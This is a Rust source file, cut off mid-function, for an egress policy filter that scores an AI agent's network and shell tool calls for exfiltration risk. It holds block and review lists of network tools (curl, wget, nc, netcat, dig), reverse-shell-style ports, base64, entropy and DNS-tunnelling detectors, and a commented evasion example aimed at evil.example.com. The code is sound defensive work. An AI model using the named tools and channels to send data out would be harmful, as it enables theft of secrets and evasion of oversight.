// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Egress destination policy enforcement filter.

use crate::filters::{FilterPhase, SecurityFilter};
use crate::scoring::severity_for;
use crate::types::{FilterResult, Severity, ToolCallContext, ToolCallType};
use regex::Regex;
use serde::Deserialize;
use std::collections::{HashMap, HashSet};
use std::net::IpAddr;

/// Sub-threshold score for an unknown DNS-query destination (FP §5.9). Kept
/// below the queue threshold so routine name resolution never queues on its
/// own, while still tagging the destination and contributing to the composite
/// when other risk is present. Non-DNS unknown destinations keep the full
/// review score.
const UNKNOWN_DNS_SOFT_SCORE: f64 = 0.5;

#[derive(Debug, Clone, Copy, Default, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum EgressMode {
    Monitor,
    #[default]
    Review,
    Enforce,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct EgressPolicyConfig {
    pub enabled: bool,
    pub mode: EgressMode,
    pub trusted_domains: Vec<String>,
    pub blocked_domains: Vec<String>,
    pub blocked_schemes: Vec<String>,
    pub review_schemes: Vec<String>,
    pub blocked_ports: Vec<u16>,
    pub review_ports: Vec<u16>,
    pub allow_private_ip: bool,
    pub review_unknown_destinations: bool,
    pub blocked_command_tokens: Vec<String>,
    pub review_command_tokens: Vec<String>,
    /// Minimum Shannon entropy (bits-per-char) to flag a URL/arg segment.
    pub entropy_threshold: f64,
    /// Minimum length of a contiguous base64-alphabet run to flag.
    pub base64_min_chunk_len: usize,
    /// URL length (chars) above which the request is flagged.
    pub suspicious_url_length: usize,
    /// Command argument total length (chars) above which the request is flagged.
    pub suspicious_arg_length: usize,
    /// Ports considered unusual for outbound connections (flagged at review level).
    pub unusual_ports: Vec<u16>,
    /// Per-profile trusted destination overrides. Maps profile name to a list of
    /// trusted domains for that profile (e.g., "claude-code" → ["api.anthropic.com"]).
    /// These are merged with the global `trusted_domains` when evaluating calls with
    /// a matching `profile_name` on the `ToolCallContext`.
    pub profile_trusted_domains: HashMap<String, Vec<String>>,
}

impl Default for EgressPolicyConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            mode: EgressMode::Review,
            trusted_domains: vec![],
            blocked_domains: vec![],
            blocked_schemes: vec![
                "ftp".into(),
                "sftp".into(),
                "tftp".into(),
                "gopher".into(),
                "file".into(),
                "data".into(),
            ],
            review_schemes: vec!["smtp".into(), "dns".into(), "ws".into(), "wss".into()],
            blocked_ports: vec![21, 23, 25],
            review_ports: vec![53, 110, 143, 445, 587, 2525],
            allow_private_ip: true,
            review_unknown_destinations: true,
            // Command tokens are matched as whole-word basenames against each
            // argv element (see `evaluate_command_tokens`). No whitespace
            // padding — tokens are normalised by lowercasing and trimming,
            // then equality-matched per argv token. This avoids substring
            // false positives (e.g. "dig" matching "digest", "nc" matching
            // "incremental").
            blocked_command_tokens: vec![
                "nslookup".into(),
                "dig".into(),
                "ftp".into(),
                "sftp".into(),
            ],
            review_command_tokens: vec![
                "curl".into(),
                "wget".into(),
                "nc".into(),
                "netcat".into(),
                "scp".into(),
            ],
            entropy_threshold: 4.5,
            base64_min_chunk_len: 40,
            suspicious_url_length: 2000,
            suspicious_arg_length: 4000,
            unusual_ports: vec![
                4444, 5555, 6666, 6667, 6697, 8443, 8888, 9090, 9999, 1337, 31337,
            ],
            profile_trusted_domains: HashMap::new(),
        }
    }
}

#[derive(Debug, Clone)]
struct Destination {
    scheme: Option<String>,
    host: String,
    port: Option<u16>,
}

pub struct EgressPolicyFilter {
    mode: EgressMode,
    trusted_domains: HashSet<String>,
    blocked_domains: HashSet<String>,
    blocked_schemes: HashSet<String>,
    review_schemes: HashSet<String>,
    blocked_ports: HashSet<u16>,
    review_ports: HashSet<u16>,
    allow_private_ip: bool,
    review_unknown_destinations: bool,
    blocked_command_tokens: Vec<String>,
    review_command_tokens: Vec<String>,
    command_url_regex: Regex,
    entropy_threshold: f64,
    base64_min_chunk_len: usize,
    suspicious_url_length: usize,
    suspicious_arg_length: usize,
    unusual_ports: HashSet<u16>,
    /// Per-profile trusted domain sets. When a `ToolCallContext` has a `profile_name`,
    /// these are checked alongside the global `trusted_domains`.
    profile_trusted: HashMap<String, HashSet<String>>,
}

impl EgressPolicyFilter {
    pub fn from_config(config: EgressPolicyConfig) -> Self {
        let command_url_regex =
            Regex::new(r#"([A-Za-z][A-Za-z0-9+\.-]*://[^\s"']+)"#).expect("regex must compile");

        let profile_trusted = config
            .profile_trusted_domains
            .into_iter()
            .map(|(name, domains)| (name.to_lowercase(), normalize_domains(domains)))
            .collect();

        Self {
            mode: config.mode,
            trusted_domains: normalize_domains(config.trusted_domains),
            blocked_domains: normalize_domains(config.blocked_domains),
            blocked_schemes: normalize_tokens(config.blocked_schemes),
            review_schemes: normalize_tokens(config.review_schemes),
            blocked_ports: config.blocked_ports.into_iter().collect(),
            review_ports: config.review_ports.into_iter().collect(),
            allow_private_ip: config.allow_private_ip,
            review_unknown_destinations: config.review_unknown_destinations,
            blocked_command_tokens: normalize_vec(config.blocked_command_tokens),
            review_command_tokens: normalize_vec(config.review_command_tokens),
            command_url_regex,
            entropy_threshold: config.entropy_threshold,
            base64_min_chunk_len: config.base64_min_chunk_len,
            suspicious_url_length: config.suspicious_url_length,
            suspicious_arg_length: config.suspicious_arg_length,
            unusual_ports: config.unusual_ports.into_iter().collect(),
            profile_trusted,
        }
    }

    pub fn with_defaults() -> Self {
        Self::from_config(EgressPolicyConfig::default())
    }

    fn blocked_score(&self) -> f64 {
        match self.mode {
            EgressMode::Enforce => 9.0,
            EgressMode::Review => 6.5,
            EgressMode::Monitor => 2.0,
        }
    }

    fn review_score(&self) -> f64 {
        match self.mode {
            EgressMode::Enforce => 4.5,
            EgressMode::Review => 3.5,
            EgressMode::Monitor => 1.0,
        }
    }

    fn domain_matches(domains: &HashSet<String>, host: &str) -> bool {
        let host = host.to_lowercase();
        domains
            .iter()
            .any(|domain| host == *domain || host.ends_with(&format!(".{domain}")))
    }

    /// True when `host` is an operator-configured trusted domain or one of the
    /// resolved profile's trusted destinations. Used to gate exfil-shape
    /// scoring on spawned URL tools: a signed / token-bearing URL to a routine
    /// host (a presigned S3 link, an OAuth bearer, a `raw.githubusercontent.com`
    /// commit-SHA path) is expected and must not be scored, so the check adds no
    /// approvals on the trusted-destination happy path.
    fn is_trusted_host(&self, host: &str, profile_trusted: Option<&HashSet<String>>) -> bool {
        Self::domain_matches(&self.trusted_domains, host)
            || profile_trusted.is_some_and(|domains| Self::domain_matches(domains, host))
    }

    /// True when `host` is trusted for review-suppression purposes: an
    /// operator/profile trusted domain, or — when the operator permits
    /// private-IP egress (`allow_private_ip = true`, the default) — a
    /// private/loopback host. A headless-browser or curl invocation against
    /// a loopback dev server is local development, not egress to review;
    /// the bare-token scanner already treats private/loopback IPs as local
    /// (`command_has_untrusted_bare_destination`), so this extends the same
    /// judgement to `scheme://` URL destinations. With
    /// `allow_private_ip = false` the earlier `private-address-egress` rule
    /// keeps full coverage.
    fn is_trusted_or_allowed_local(
        &self,
        host: &str,
        profile_trusted: Option<&HashSet<String>>,
    ) -> bool {
        self.is_trusted_host(host, profile_trusted)
            || (self.allow_private_ip && is_private_or_local_host(host))
    }

    fn parse_url_destination(url: &str) -> Option<Destination> {
        let (scheme, rest) = url.split_once("://")?;
        if scheme.is_empty() {
            return None;
        }

        let authority = rest.split('/').next().unwrap_or(rest);
        let authority = authority.rsplit('@').next().unwrap_or(authority);
        let (host, port) = parse_host_port(authority);
        if host.is_empty() {
            return None;
        }

        Some(Destination {
            scheme: Some(scheme.to_lowercase()),
            host: host.to_lowercase(),
            port,
        })
    }

    fn parse_net_destination(address: &str, port: u16) -> Destination {
        Destination {
            scheme: None,
            host: address.to_lowercase(),
            port: Some(port),
        }
    }

    fn default_port_for_scheme(scheme: &str) -> Option<u16> {
        match scheme {
            "http" => Some(80),
            "https" => Some(443),
            "ws" => Some(80),
            "wss" => Some(443),
            "ftp" => Some(21),
            "sftp" => Some(22),
            "smtp" => Some(25),
            "dns" => Some(53),
            _ => None,
        }
    }

    fn extract_destinations_from_command(&self, command: &str) -> Vec<Destination> {
        self.command_url_regex
            .captures_iter(command)
            .filter_map(|caps| caps.get(1).map(|m| m.as_str()))
            .filter_map(Self::parse_url_destination)
            // Cloud object-storage URIs (`s3://bucket/key`, `gs://…`, …) name a
            // bucket/object, not a resolvable network host. The actual egress to
            // the provider API (`*.s3.amazonaws.com`, …) is observed and
            // policy-checked at NetConnect / HttpRequest time; parsing the
            // bucket name here as a "destination host" both mis-attributes the
            // host and flags every routine CLI op (`aws s3 rm s3://staging/obj`,
            // `gsutil ls gs://…`) as an unknown destination — a non-
            // discriminating false positive (an attacker bucket and a staging
            // bucket are indistinguishable to the unknown-destination check).
            .filter(|d| !d.scheme.as_deref().is_some_and(is_object_storage_uri_scheme))
            .collect()
    }

    fn evaluate_destination(
        &self,
        dest: &Destination,
        source: &str,
        profile_trusted: Option<&HashSet<String>>,
    ) -> Option<FilterResult> {
        let effective_port = dest.port.or_else(|| {
            dest.scheme
                .as_deref()
                .and_then(Self::default_port_for_scheme)
        });

        if let Some(scheme) = &dest.scheme {
            if self.blocked_schemes.contains(scheme) {
                let score = self.blocked_score();
                return Some(FilterResult::matched(
                    "egress-policy",
                    "blocked-scheme",
                    score,
                    severity_for(score),
                    format!("Blocked outbound scheme from {source}: {scheme}"),
                ));
            }
        }

        if Self::domain_matches(&self.blocked_domains, &dest.host) {
            let score = self.blocked_score();
            return Some(FilterResult::matched(
                "egress-policy",
                "blocked-domain",
                score,
                severity_for(score),
                format!("Blocked outbound destination from {source}: {}", dest.host),
            ));
        }

        if let Some(port) = effective_port {
            if self.blocked_ports.contains(&port) {
                let score = self.blocked_score();
                return Some(FilterResult::matched(
                    "egress-policy",
                    "blocked-port",
                    score,
                    severity_for(score),
                    format!("Blocked outbound destination port from {source}: {port}"),
                ));
            }
        }

        if !self.allow_private_ip && is_private_or_local_host(&dest.host) {
            let score = self.review_score();
            return Some(FilterResult::matched(
                "egress-policy",
                "private-address-egress",
                score,
                severity_for(score),
                format!(
                    "Private/local address outbound from {source}: {}",
                    dest.host
                ),
            ));
        }

        if let Some(scheme) = &dest.scheme {
            if self.review_schemes.contains(scheme) {
                let score = self.review_score();
                return Some(FilterResult::matched(
                    "egress-policy",
                    "review-scheme",
                    score,
                    severity_for(score),
                    format!("Review outbound scheme from {source}: {scheme}"),
                ));
            }
        }

        if let Some(port) = effective_port {
            // FP §5.9: a DnsQuery carries an artificial port 53 (the lookup is
            // not a connection to a DNS server). Don't let the review-port
            // mechanism flag routine name resolution; the subsequent connection
            // is scored separately, and DNS-tunneling shapes are still caught by
            // the protocol signals run on the DnsQuery arm.
            if self.review_ports.contains(&port) && source != "dns_query" {
                let score = self.review_score();
                return Some(FilterResult::matched(
                    "egress-policy",
                    "review-port",
                    score,
                    severity_for(score),
                    format!("Review outbound destination port from {source}: {port}"),
                ));
            }
        }

        if Self::domain_matches(&self.trusted_domains, &dest.host) {
            return Some(FilterResult::matched(
                "egress-policy",
                "trusted-destination",
                -1.0,
                Severity::Notice,
                format!("Trusted outbound destination from {source}: {}", dest.host),
            ));
        }

        if let Some(profile_domains) = profile_trusted {
            if Self::domain_matches(profile_domains, &dest.host) {
                return Some(FilterResult::matched(
                    "egress-policy",
                    "profile-trusted-destination",
                    -1.0,
                    Severity::Notice,
                    format!(
                        "Profile-trusted outbound destination from {source}: {}",
                        dest.host
                    ),
                ));
            }
        }

        if self.review_unknown_destinations {
            // A private/loopback host is not an *unknown* destination when the
            // operator allows private-IP egress (`allow_private_ip = true`, the
            // default): "unknown" is a statement about internet hosts we cannot
            // vouch for, not the user's own dev server on localhost. Without
            // this carveout a spawn/connect carrying `http://localhost:<port>/`
            // queued at the full review score even though the
            // `private-address-egress` gate above deliberately let it through.
            // With `allow_private_ip = false`, private hosts never reach this
            // branch (private-address-egress returns above).
            if self.allow_private_ip && is_private_or_local_host(&dest.host) {
                return None;
            }
            // FP §5.9: a DnsQuery to an unknown host is routine on its own —
            // name resolution of a transitive dependency or redirect target.
            // Emit it as a sub-threshold forensic signal rather than a review:
            // it tags the destination (gradient vs the -1.0 trusted case) and
            // nudges the composite when other risk is present in the session,
            // but does not by itself queue routine resolution. The connection
            // that follows is scored separately, and DNS-tunnelling shapes are
            // still caught by the entropy/base64/length protocol signals run on
            // the DnsQuery arm. Non-DNS unknown destinations keep the full
            // review score.
            let is_dns = source == "dns_query";
            let score = if is_dns {
                UNKNOWN_DNS_SOFT_SCORE
            } else {
                self.review_score()
            };
            let severity = if is_dns {
                Severity::Notice
            } else {
                severity_for(score)
            };
            return Some(FilterResult::matched(
                "egress-policy",
                "unknown-destination",
                score,
                severity,
                format!("Unknown outbound destination from {source}: {}", dest.host),
            ));
        }

        None
    }

    /// Evaluate every candidate hostname from an ambiguous shared-IP DNS
    /// attribution and return the worst-case result.
    ///
    /// "Worst case" ranks by effective score, where a candidate the filter
    /// has no opinion on (`None`) counts as 0.0. That makes `None` outrank a
    /// negative (trusted) result, so a mixed candidate set never inherits
    /// another candidate's trusted credit; only a set where every candidate
    /// scores negative keeps the -1.0. Positive-scoring results carry the
    /// full candidate list in their message so the operator prompt shows why
    /// a name they trust is implicated.
    ///
    /// The caller guarantees `candidates` is non-empty
    /// (`parse_dns_candidate_array` rejects empty arrays).
    fn evaluate_worst_case_candidate(
        &self,
        candidates: &[String],
        port: u16,
        profile_trusted: Option<&HashSet<String>>,
    ) -> Option<FilterResult> {
        let mut worst: Option<Option<FilterResult>> = None;
        for candidate in candidates {
            let dest = Self::parse_net_destination(candidate, port);
            let result = self.evaluate_destination(&dest, "net_connect", profile_trusted);
            let score = result.as_ref().map_or(0.0, |r| r.score);
            let worst_score = worst
                .as_ref()
                .map(|prior| prior.as_ref().map_or(0.0, |r| r.score));
            if worst_score.is_none_or(|prior| score > prior) {
                worst = Some(result);
            }
        }
        let mut result = worst.flatten()?;
        if result.score > 0.0 {
            result.message = format!(
                "{} (ambiguous shared-IP DNS attribution; candidates: {})",
                result.message,
                candidates.join(", ")
            );
        }
        Some(result)
    }

    /// Evaluate protocol-specific risk signals on a string (URL, command args, etc.).
    /// Returns the highest-risk signal found, if any.
    fn evaluate_protocol_signals(&self, text: &str, source: &str) -> Option<FilterResult> {
        let mut best: Option<FilterResult> = None;

        // 1. Suspicious length
        let len_limit = if source.contains("url") {
            self.suspicious_url_length
        } else {
            self.suspicious_arg_length
        };
        if text.len() > len_limit {
            let score = self.review_score();
            best = Self::select_higher_risk(
                best,
                Some(FilterResult::matched(
                    "egress-policy",
                    "suspicious-length",
                    score,
                    severity_for(score),
                    format!(
                        "Suspicious {source} length ({} chars, threshold {len_limit})",
                        text.len()
                    ),
                )),
            );
        }

        // 2. Base64 chunking — look for long runs of base64-alphabet characters
        if let Some(run_len) = longest_base64_run(text) {
            if run_len >= self.base64_min_chunk_len {
                let score = self.review_score();
                best = Self::select_higher_risk(
                    best,
                    Some(FilterResult::matched(
                        "egress-policy",
                        "base64-chunking",
                        score,
                        severity_for(score),
                        format!(
                            "Possible base64-encoded payload in {source} ({run_len} char run, threshold {})",
                            self.base64_min_chunk_len
                        ),
                    )),
                );
            }
        }

        // 3. Entropy burst — check segments separated by common delimiters
        for segment in text.split(['/', '?', '&', '=', ' ']) {
            if segment.len() < 16 {
                continue;
            }
            let entropy = shannon_entropy(segment);
            if entropy >= self.entropy_threshold {
                let score = self.review_score();
                best = Self::select_higher_risk(
                    best,
                    Some(FilterResult::matched(
                        "egress-policy",
                        "high-entropy-segment",
                        score,
                        severity_for(score),
                        format!(
                            "High-entropy segment in {source} (entropy {entropy:.2} bits/char, threshold {})",
                            self.entropy_threshold
                        ),
                    )),
                );
                break; // one hit is enough
            }
        }

        best
    }

    /// Check whether a destination port is in the unusual-ports set.
    fn evaluate_unusual_port(&self, dest: &Destination, source: &str) -> Option<FilterResult> {
        let effective_port = dest.port.or_else(|| {
            dest.scheme
                .as_deref()
                .and_then(Self::default_port_for_scheme)
        });

        if let Some(port) = effective_port {
            if self.unusual_ports.contains(&port)
                && !self.blocked_ports.contains(&port)
                && !self.review_ports.contains(&port)
            {
                let score = self.review_score();
                return Some(FilterResult::matched(
                    "egress-policy",
                    "unusual-port",
                    score,
                    severity_for(score),
                    format!("Unusual outbound destination port from {source}: {port}"),
                ));
            }
        }

        None
    }

    /// Match each whitespace-separated token in `command` against the
    /// blocked/review token lists by basename equality.
    ///
    /// Each argv element is lowercased, stripped of a leading absolute path
    /// (so `/usr/bin/curl` matches `curl`), and equality-checked against the
    /// configured token sets. This is the correct shape: the lists name
    /// outbound binaries, not arbitrary substrings.
    ///
    /// Replaces the previous `lowered.contains(token)` substring match, which
    /// produced false positives on identifiers containing the token as a
    /// substring (e.g. `incremental` contains `nc`, `digest` contains `dig`,
    /// `linux-gnu` does not contain `gnu` adjacent to whitespace).
    fn evaluate_command_tokens(
        &self,
        command: &str,
        prof_trusted: Option<&HashSet<String>>,
    ) -> Option<FilterResult> {
        let basenames: Vec<&str> = command.split_whitespace().map(token_basename).collect();

        for token in &self.blocked_command_tokens {
            if basenames.iter().any(|b| b.eq_ignore_ascii_case(token)) {
                let score = self.blocked_score();
                return Some(FilterResult::matched(
                    "egress-policy",
                    "blocked-egress-command-token",
                    score,
                    severity_for(score),
                    format!("Blocked outbound command token: {token}"),
                ));
            }
        }

        for token in &self.review_command_tokens {
            if basenames.iter().any(|b| b.eq_ignore_ascii_case(token)) {
                // FP §5.4: a curl/wget/scp spawn is only review-worthy when it
                // targets an UNTRUSTED destination. When every URL destination
                // in the command is trusted (`curl https://github.com/...`),
                // suppress the spawn-time token signal — the connection itself
                // is separately scored at connect time, and a trusted-
                // destination fetch during a build is routine. Untrusted, or
                // destination-less commands (`curl --version`, or a bare host
                // we can't parse), still fire — so the guard is not widened.
                if self.command_targets_only_trusted_destinations(command, prof_trusted) {
                    return None;
                }
                let score = self.review_score();
                return Some(FilterResult::matched(
                    "egress-policy",
                    "review-egress-command-token",
                    score,
                    severity_for(score),
                    format!("Review outbound command token: {token}"),
                ));
            }
        }

        None
    }

    /// FP §5.4 guard helper: true iff it is SAFE to suppress the curl/wget/scp
    /// spawn-token signal — i.e. the command references at least one trusted URL
    /// destination AND has no destination we cannot confirm is trusted.
    ///
    /// Two conditions, both required:
    ///   1. every `scheme://` URL (from `extract_destinations_from_command`) is
    ///      trusted, AND there is at least one — a destination-less command
    ///      (`curl --version`) returns `false`; and
    ///   2. there is no scheme-LESS bare destination token that is untrusted.
    ///      The URL regex only sees `scheme://` URLs, so without (2) a bare host
    ///      (`curl https://github.com/x evil.example.com`) would ride along with
    ///      the trusted URL and be silently suppressed — the hole an adversarial
    ///      review caught. (2) closes it.
    fn command_targets_only_trusted_destinations(
        &self,
        command: &str,
        prof_trusted: Option<&HashSet<String>>,
    ) -> bool {
        let dests = self.extract_destinations_from_command(command);
        if dests.is_empty() {
            return false;
        }
        let is_trusted = |host: &str| {
            let host = host.to_lowercase();
            // Allowed-local counts as trusted here for the same reason it does
            // in the destination loops: `curl http://localhost:3000/api`
            // against the operator's own dev server is routine local
            // development when `allow_private_ip` is on, not an egress fetch
            // worth queueing.
            self.is_trusted_or_allowed_local(&host, prof_trusted)
        };
        dests.iter().all(|d| is_trusted(&d.host))
            && !self.command_has_untrusted_bare_destination(command, &is_trusted)
    }

    /// Best-effort scan for a scheme-LESS token that curl/wget/scp would treat
    /// as a destination host but that is NOT trusted. Skips flags and the values
    /// they consume (so `-o output.json` is not mistaken for a host), `@data`
    /// sources, local paths, and scheme URLs (handled by the URL regex).
    /// Conservative: an untrusted bare host or public bare IP blocks suppression.
    fn command_has_untrusted_bare_destination(
        &self,
        command: &str,
        is_trusted: &impl Fn(&str) -> bool,
    ) -> bool {
        let tokens: Vec<&str> = command.split_whitespace().collect();
        let mut prev = "";
        for (i, tok) in tokens.iter().enumerate() {
            let t = *tok;
            let prev_consumes_value = VALUE_TAKING_FETCH_FLAGS.contains(&prev);
            prev = t;
            if i == 0 || prev_consumes_value {
                continue; // the binary itself, or a flag's value
            }
            if t.starts_with('-') || t.starts_with('@') {
                continue; // flag, or curl `@file` data source
            }
            if t.starts_with('/') || t.starts_with("./") || t.starts_with("../") {
                continue; // local path
            }
            if t.contains("://") {
                continue; // scheme URL — already covered by the URL regex
            }
            // Strip a trailing /path and :port, and any user@ prefix.
            let host = t.split('/').next().unwrap_or(t);
            let host = host.split('?').next().unwrap_or(host);
            let host = host.rsplit('@').next().unwrap_or(host);
            let host_no_port = host.split(':').next().unwrap_or(host);
            // A bare public IP is a destination; a private/loopback one is local.
            if host_no_port.parse::<std::net::IpAddr>().is_ok() {
                if !is_private_or_local_host(host_no_port) {
                    return true;
                }
                continue;
            }
            if looks_like_hostname(host_no_port) && !is_trusted(host_no_port) {
                return true;
            }
        }
        false
    }

    fn select_higher_risk(
        current: Option<FilterResult>,
        next: Option<FilterResult>,
    ) -> Option<FilterResult> {
        match (current, next) {
            (None, rhs) => rhs,
            (lhs, None) => lhs,
            (Some(lhs), Some(rhs)) => {
                if rhs.score > lhs.score {
                    Some(rhs)
                } else {
                    Some(lhs)
                }
            }
        }
    }
}

#[async_trait::async_trait]
impl SecurityFilter for EgressPolicyFilter {
    fn name(&self) -> &str {
        "egress-policy"
    }

    fn phase(&self) -> FilterPhase {
        FilterPhase::Pattern
    }

    async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
        let mut best: Option<FilterResult> = None;
        // C2: track whether *any* exfil-shape signal fired (base64/high-entropy/
        // suspicious-length/DNS-tunnelling), even when a higher-scored signal
        // (unknown-destination, command-token) wins the collapsed result. Stamped
        // as `exfil_shape` metadata so the precision meta-rule can combine it with
        // reputation / taint across filters — the shape alone only fires here for
        // untrusted destinations (W1 trust-gate), so its mere presence already
        // means "shaped payload to a host we don't trust".
        let mut exfil_shape = false;

        // Resolve per-profile trusted domains for this context.
        let prof_trusted = ctx
            .profile_name
            .as_ref()
            .and_then(|name| self.profile_trusted.get(&name.to_lowercase()));

        match &ctx.call_type {
            ToolCallType::HttpRequest { url, .. } => {
                let dest = Self::parse_url_destination(url);
                // Untrusted when the host is unknown or the URL won't parse; a
                // trusted (or allowed-local) host detects the shape (for C2)
                // but does not standalone-score it.
                let untrusted = dest
                    .as_ref()
                    .is_none_or(|d| !self.is_trusted_or_allowed_local(&d.host, prof_trusted));
                if let Some(dest) = &dest {
                    best = Self::select_higher_risk(
                        best,
                        self.evaluate_destination(dest, "http_request", prof_trusted),
                    );
                    best = Self::select_higher_risk(
                        best,
                        self.evaluate_unusual_port(dest, "http_request"),
                    );
                }
                // W2: shape-score the full URL (path+query). The score is added
                // only for an untrusted destination — a signed/token URL to a
                // trusted host must not queue on its own — but the exfil_shape
                // flag is set whenever a shape rides a real destination, so C2
                // can still escalate a shaped payload to a trusted host when
                // reputation/taint corroborates.
                let shape = self.evaluate_protocol_signals(url, "url");
                if dest.is_some() && shape.is_some() {
                    exfil_shape = true;
                }
                if untrusted {
                    best = Self::select_higher_risk(best, shape);
                }
            }
            ToolCallType::NetConnect { address, port } => {
                if address.starts_with("raw:") {
                    // Raw socket family (AF_PACKET, AF_NETLINK, etc.) detected.
                    // AF_PACKET bypasses the IP stack entirely and can exfiltrate
                    // arbitrary Ethernet frames. Score unconditionally high so the
                    // call lands well above the deny threshold regardless of mode.
                    return Ok(FilterResult::matched(
                        "egress-policy",
                        "raw-socket",
                        7.0,
                        severity_for(7.0),
                        format!("Raw socket ({address}): can exfiltrate data bypassing IP stack"),
                    ));
                }
                // Ambiguous shared-IP DNS attribution renders the address as
                // a JSON hostname array (`["a.example","b.example"]`): the IP
                // is shared CDN infrastructure and the tenant actually reached
                // is selected by SNI/Host after connect(2), which we never
                // see. Score the call as if it could reach ANY candidate:
                // evaluate each independently and keep the worst-case result.
                // The trusted-destination credit therefore applies only when
                // every candidate earns it, and a blocked candidate escalates
                // the whole call even when a trusted name shares the IP.
                let destination_result = match crate::types::parse_dns_candidate_array(address) {
                    Some(candidates) => {
                        self.evaluate_worst_case_candidate(&candidates, *port, prof_trusted)
                    }
                    None => {
                        let dest = Self::parse_net_destination(address, *port);
                        self.evaluate_destination(&dest, "net_connect", prof_trusted)
                    }
                };
                best = Self::select_higher_risk(best, destination_result);
                // Port risk is host-independent; one check covers every
                // candidate.
                best = Self::select_higher_risk(
                    best,
                    self.evaluate_unusual_port(
                        &Self::parse_net_destination(address, *port),
                        "net_connect",
                    ),
                );
            }
            ToolCallType::NetListen { address, port } => {
                if address.starts_with("raw:") {
                    return Ok(FilterResult::matched(
                        "egress-policy",
                        "raw-socket",
                        7.0,
                        severity_for(7.0),
                        format!(
                            "Raw socket bind ({address}): can exfiltrate data bypassing IP stack"
                        ),
                    ));
                }
                // PR 5 Phase C: NetListen decision matrix.
                //
                //   Loopback bind                 → no score from this filter
                //                                   (silent allow downstream).
                //   Wildcard bind, declared,      → no score; the supervisor
                //     allow_clamp=true              will rewrite the sockaddr
                //                                   to loopback (Phase D) and
                //                                   audit the rewrite.
                //   Wildcard bind, declared,      → +5.0 QUEUE  with rule_id
                //     allow_clamp=false             "wildcard-bind-declared-
                //                                   no-clamp".
                //   Wildcard bind, undeclared     → +5.0 QUEUE  with rule_id
                //                                   "wildcard-bind-undeclared".
                //   Specific non-loopback         → +5.0 QUEUE  with rule_id
                //                                   "specific-iface-bind".
                //
                // The OpenClaw-specific arm was a precursor to this matrix;
                // we now apply the same gating across every profile.
                let is_loopback = is_loopback_bind_address(address);
                let is_wildcard = is_wildcard_bind_address(address);
                if !is_loopback {
                    let policy_match = ctx.listener_policy_match.as_ref();
                    let (rule_id, msg) = if is_wildcard {
                        match policy_match {
                            Some(m) if m.allow_clamp => {
                                // PR 69 Change 4: declared + clamp is
                                // the security control for this path.
                                // Returning no_match here prevents
                                // `evaluate_destination(0.0.0.0)` /
                                // `evaluate_destination(::)` from
                                // scoring the bind as an unknown
                                // outbound destination — the address
                                // never reaches the network because
                                // the supervisor rewrites it to
                                // loopback before `bind(2)`.
                                return Ok(FilterResult::no_match("egress-policy"));
                            }
                            Some(_) => (
                                "wildcard-bind-declared-no-clamp",
                                format!(
                                    "Wildcard bind on declared port {port} \
                                     (allow_clamp = false) requires approval \
                                     (address: {address}:{port})"
                                ),
                            ),
                            None => (
                                "wildcard-bind-undeclared",
                                format!(
                                    "Wildcard bind not declared in profile's \
                                     local_listener_policy requires approval \
                                     (address: {address}:{port})"
                                ),
                            ),
                        }
                    } else {
                        (
                            "specific-iface-bind",
                            format!(
                                "Bind to specific non-loopback interface requires \
                                 approval (address: {address}:{port})"
                            ),
                        )
                    };
                    best = Some(FilterResult::matched(
                        "egress-policy",
                        rule_id,
                        5.0,
                        severity_for(5.0),
                        msg,
                    ));
                }
                let dest = Self::parse_net_destination(address, *port);
                best = Self::select_higher_risk(
                    best,
                    self.evaluate_destination(&dest, "net_listen", prof_trusted),
                );
                best =
                    Self::select_higher_risk(best, self.evaluate_unusual_port(&dest, "net_listen"));
            }
            ToolCallType::DnsQuery { domain, query_type } => {
                let dest = Self::parse_net_destination(domain, 53);
                // Honours blocked/trusted domains and unknown-destination.
                // review-port stays suppressed because port 53 is artificial
                // for DNS query events.
                best = Self::select_higher_risk(
                    best,
                    self.evaluate_destination(&dest, "dns_query", prof_trusted),
                );
                // W4: dedicated DNS-tunnelling sub-signal — encoded/high-entropy
                // subdomain labels, weighted up for data-bearing query types
                // (TXT/NULL/CNAME/ANY). Catches base32/hex tunnelling the
                // base64-only generic scan misses, and — because it runs on the
                // domain, not the destination — fires even under a trusted
                // parent zone (the supervisor's allowlist short-circuit defers
                // to this before allowing a query below an allowlisted parent).
                // Evaluated before the generic scan so the more informative,
                // qtype-weighted signal wins on a score tie.
                if let Some(sig) = dns_tunneling_signal(domain, query_type) {
                    exfil_shape = true;
                    let mut score = self.review_score();
                    if sig.high_risk_qtype {
                        // Data-bearing query type — the classic exfil channel.
                        score += 2.0;
                    }
                    best = Self::select_higher_risk(
                        best,
                        Some(FilterResult::matched(
                            "egress-policy",
                            "dns-tunneling",
                            score,
                            severity_for(score),
                            format!("Possible DNS tunnelling in query: {}", sig.reason),
                        )),
                    );
                }
                // Generic shape scan (base64 runs). The suspicious-*length*
                // component is inert for DNS (a QNAME is short), so the dedicated
                // signal above is the primary DNS-tunnelling detector; this
                // remains as a complementary base64-run catch.
                let shape = self.evaluate_protocol_signals(domain, "dns_query");
                exfil_shape |= shape.is_some();
                best = Self::select_higher_risk(best, shape);
            }
            ToolCallType::ShellExec { .. } => {
                if let Some(full) = ctx.full_command() {
                    best = Self::select_higher_risk(
                        best,
                        self.evaluate_command_tokens(&full, prof_trusted),
                    );
                    let is_trusted =
                        |host: &str| self.is_trusted_or_allowed_local(host, prof_trusted);
                    let mut has_dest = false;
                    let mut has_untrusted_dest = false;
                    for dest in self.extract_destinations_from_command(&full) {
                        has_dest = true;
                        if !is_trusted(&dest.host) {
                            has_untrusted_dest = true;
                        }
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_destination(&dest, "command", prof_trusted),
                        );
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_unusual_port(&dest, "command"),
                        );
                    }
                    if !has_untrusted_dest
                        && self.command_has_untrusted_bare_destination(&full, &is_trusted)
                    {
                        has_untrusted_dest = true;
                    }
                    if has_untrusted_dest {
                        has_dest = true;
                    }
                    // W2: consistent with ProcessSpawn — shape is scored only for
                    // an untrusted destination (so a SHA/digest arg or a signed
                    // URL to a trusted host no longer queues on its own), while
                    // the exfil_shape flag is set for any shaped payload heading
                    // to a real destination so C2 can corroborate.
                    let shape = self.evaluate_protocol_signals(&full, "command_args");
                    if has_dest && shape.is_some() {
